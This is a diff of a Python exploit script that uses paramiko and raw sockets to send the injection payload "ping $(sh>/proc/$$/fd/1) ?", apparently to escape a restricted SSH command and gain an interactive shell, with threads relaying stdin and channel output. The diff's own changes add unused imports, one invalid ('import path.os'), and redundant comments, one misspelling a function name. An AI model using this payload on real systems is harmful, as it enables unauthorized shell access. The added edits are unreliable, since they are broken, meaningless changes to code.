@@ -1,7 +1,11 @@
+import os
+import path.os
 import socket
 import sys
+import webbrowser
 import paramiko
 import threading
+
 
 lock = threading.RLock()
 payload = "ping $(sh>/proc/$$/fd/1) ?"
@@ -9,11 +13,13 @@ session = None
 transport = None
 stopbinding = False
 
+# create def write(value):
 def write(value):
     with lock:
         sys.stdout.write(value)
         sys.stdout.flush()
 
+# create def channel_intercept():
 def channel_intercept():
     try:
         global stopbinding
@@ -37,6 +43,7 @@ def channel_intercept():
         stopbinding = True
         transport.close()
 
+# create def bind_stbin():
 def bind_stdin():
     try:
         global stopbinding
@@ -49,6 +56,7 @@ def bind_stdin():
         stopbinding = True
         transport.close()
 
+# create def init():
 def init():
         #paramiko.util.log_to_file('demo.log')
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
